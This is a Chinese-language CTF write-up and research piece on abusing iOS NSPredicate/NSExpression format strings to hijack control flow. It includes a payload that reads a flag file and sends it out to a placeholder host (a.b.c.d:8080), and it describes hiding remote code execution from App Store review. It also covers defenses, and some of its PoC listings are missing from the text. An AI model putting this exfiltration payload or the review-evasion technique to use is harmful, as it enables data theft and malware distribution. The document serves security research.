  * 还好 One-liner 仍然可以做很多事情
我们写了一个 python 工具类帮助生成谓词语法：
回到题目本身。由于笔者疏忽，在当时的 rwctf 上提供的二进制文件仍然是 arm64（而不是 arm64e）。这就导致原本想要的 PAC
噱头，实际上没有启用。
笔者还犯了一个错误。运维环境基于 lldb 的 USB 调试，由于 lldb 协议的局限性，自动化启动 app 时并不支持传入 URL
scheme，所以实际上是用 argv。App 还有一个 bug，没有在 delegate 里同步状态，导致实际上只有 argv 是有效的，而 URL
scheme 不能正确传入参数。这让一些在模拟器上测试的选手非常困惑
没有 PA，也就是说 ROP 仍然可用。那么在这个题目的设定之下，允许传入 NSExpression，能否控 pc？
在 SLOP 里用了一个私有函数（gadget）-[NSInvocation invokeUsingIMP:]，imp 参数即是函数指针，在不违反 PAC
限制（例如 arm64 架构，或者函数指针被 zero context 签名过）的前提下是可以修改程序控制流的。
但这个方法有一个特点，就是要求 NSInvocation 实例的 target 对象（对应 objc_msgSend 第一个参数）不得为空，否则不执行。
因此我们需要实现如下的调用链：
  * +[NSInvocation alloc]
  * -[NSInvocation setTarget:]
  * -[NSInvocation invokeUsingIMP:]
在这里同一个变量被使用了两次，意味着没办法转换成 one-liner 的形式。
还好在标准库里直接有一个 gadget 可以帮忙：
    [[NSInvocationOperation alloc] initWithTarget:target 
                                         selector:sel object:nil]
一行代码里就可以初始化一个 NSInvocationOperation 对象的 target、selector 和 object，接着用 FUNCTION
表达式访问其 invocation 属性即可返回对应的 NSInvocation。
一个要求就是，在这里的 selector: 参数不能是一个简单的字符串。因此我们用到了另一个 gadget 用来调用
NSSelectorFromString：
    [[[NSFunctionExpression alloc] initWithTarget:@""
                                     selectorName:@"alloc"
                                        arguments:@[]] selector]
具体的 selector 和 object 都不重要，我们只需要让 target 不为空，以及能控制 imp 的值。
最终的 PoC 代码如下
转化为表达式：
至于地址随机化的问题，可以参考 SLOP 的做法，用 -[CNFileServices dlsym::] 或者 -[ABFileServices
dlsym::]（实际上就是 dlsym 的包装）直接解析出符号。
到这一步题目的做法就很清晰了。首先获取 flag 文件的路径，然后读取到一个 NSData 当中。回传数据非常简单，只需要用 Foundation 里的
[NSData dataWithContentsOfURL:] 或者 [NSString
stringWithContentsOfURL:]，就会隐式地发起一个 HTTP GET 请求来获取对应 URL 内容，从而把参数回传出去：
    NSString* path = [[NSBundle main] pathForResource:"flag" ofType:""];
    NSString* flag = [[NSData dataWithContentsOfFile:path] base64Encoding];
    NSString* urlString = [@"http://a.b.c.d:8080/" stringByAppendingString:flag];
    NSURL* url = [NSURL URLWithString:urlString];
    [NSData dataWithContentsOfURL:url];
翻译为表达式格式：
FUNCTION(CAST("NSData","Class"),'dataWithContentsOfURL:',FUNCTION(CAST("NSURL","Class"),
'URLWithString:',FUNCTION("http://a.b.c.d:
8080/",'stringByAppendingString:',FUNCTION(FUNCTION(CAST("NSData","Class"),'dataWithContentsOfFile:',FUNCTION(FUNCTION(CAST("NSBundle","Class"),'mainBundle'),'pathForResource:ofType:',"flag",
"")),'base64Encoding'))))
然后 URL 编码成为 icalc:// 接受的格式即可。
所谓 RealWorld CTF，就要提到这个研究在真实世界里的应用。
iOS 上的代码签名政策非常严格，默认情况下应用都通过 AppStore
分发，并且有审核机制。苹果严令禁止应用从远端服务器动态拉取代码执行，因为这可能绕过审核机制，实现违反应用规范的功能，甚至分发恶意代码。
在开发者社区颇受欢迎的热补丁机制则是利用一些脚本语言解释器，例如系统自带的 JavaScriptCore，也有使用 lua 的，将一些 native
的功能动态导出给脚本。在解释执行脚本的时候并不需要创建新的代码页，也就自然没有代码签名的限制。
苹果曾经发送邮件警告过使用诸如 dlsym、performSelector：等动态代码执行的行为，可能会违反应用审核规范导致被下架，波及包括
ReactNative 框架用户在内的大批开发者。
而 NSPredicate 和 NSExpression
可以做到非常隐蔽。对于恶意软件，完全可以假装在过滤数组，实际上从远端拉取了动态代码执行。这种方式完全不会出现任何动态函数调用的符号（NSClassFromString、NSSelectorFromString），也没有用到任何已知的热补丁框架。哪怕是人工做源代码级别的审查，也难以发现。
如下是一个简单的 poc，通过提供一个持久化的 NSMutableDictionary 保存上下文，并循环执行多个表达式，实现多行脚本解释执行的效果。
应用动态拉取代码的攻击此前比较著名的有两次。
iOS Hacker's Handbook 的作者之一 Charlie Miller 在 AppStore
里发布了一款“股票”应用，实际上会从远程服务器拉取动态链接库并使用 dlopen
载入，从而实现绕过商店审核执行恶意代码。在此之后苹果吊销了他的开发者证书，并加入了更严格的代码签名限制阻止这种攻击。
另一篇 USENIX 论文 Jekyll on iOS: When Benign Apps Become Evil 则采用了 Return-Oriented
Programming 的办法，在程序当中隐藏漏洞，劫持控制流之后复用系统库自带的代码来实现诸如越狱等复杂的恶意代码操作。在 A12 芯片引入 PAC
之后，这种攻击实现起来更难了。
而本文提到的动态代码执行的接口在最新硬件上仍然可用。
作为攻击面考虑，在用户可控的格式串前提下可能会造成代码执行问题，就像 ctf 题目里的那样。这个攻击面看上去和 SQL 注入非常类似。
  * +[NSPredicate predicateWithFormat:]
  * +[NSPredicate predicateWithFormat:argumentArray:]
  * +[NSPredicate predicateWithFormat:arguments:]
  * +[NSExpression expressionWithFormat:]
  * +[NSExpression expressionWithFormat:argumentArray:]
  * +[NSExpression expressionWithFormat:arguments:] 
只有当 format 参数是用户可控的字符串时才会造成风险。无论是 arguments 还是 argumentArray，在 Foundation
内部都会做类似 SQL 参数绑定的处理，不存在安全风险。
值得一提的是，format 参数可控这件事本身又是另一种经典的漏洞，格式串漏洞，和 printf 当中的利用基本类似。只是通过 runtime
特性的方式更为直接。
这种注入有没有可能出现在系统上？
苹果还真的意识到了这件事。
Foundation 有一个文档里没提到的 NSPredicateVisitor 协议。开发者可以通过实现这个协议里的委托方法来遍历表达式 AST，通过校验
expression 和 operator 的类型来过滤非法的表达式：
    @protocol NSPredicateVisitor
    @required
    -(void)visitPredicate:(id)arg1;
    -(void)visitPredicateExpression:(id)arg1;
    -(void)visitPredicateOperator:(id)arg1;
    @end
在获取相册的 API 里有一个 PHFetchOptions 类，提供一个 predicate
参数。这个类会跨进程调用，存在注入的风险。当我们阅读反汇编可以看到，在方法 -[PHQuery visitPredicateExpression:]
里实现了参数检查：
笔者在某个 USB 可以访问的开发者特性、IPC 传递的 PluginKit 参数、以及一个可能造成越狱持久化的文件、以及 macOS 上可能造成 root
提权和 SIP 绕过的 log 命令里，都看到了任意可控的 predicate 的影子。但不幸的是，它们全部都做了校验。
此外，NSPredicate 和 NSExpression 都支持序列化。
在启用了 SecureCoding 的情况下，predicateFlags 会添加一个标记，将影响到 _allowsEvaluation 的返回值。
除非显式调用一次 allowEvaluation 方法，否则表达式会拒绝执行。
这在一定程度上控制了反序列化的攻击面。但是请注意，被废弃的 + unarchiveObjectWithData: 方法是不受保护的。
本文从一个 CTF 题目展开，从官方文档结合反汇编分析，挖掘出语言和运行时鲜为人知却可能被滥用的机制。谁曾想到编译型的语言竟然也内置支持 eval？
参考文章:
  1. 
  2. 
  3. 
  4. Predicate Format String Syntax 
  5. Issue 1933: SLOP - A Userspace PAC Workaround 
  6. Wang T, Lu K, Lu L, et al. Jekyll on ios: When benign apps become evil[C]//22nd {USENIX} Security Symposium ({USENIX} Security 13). 2013: 559-572.
* * *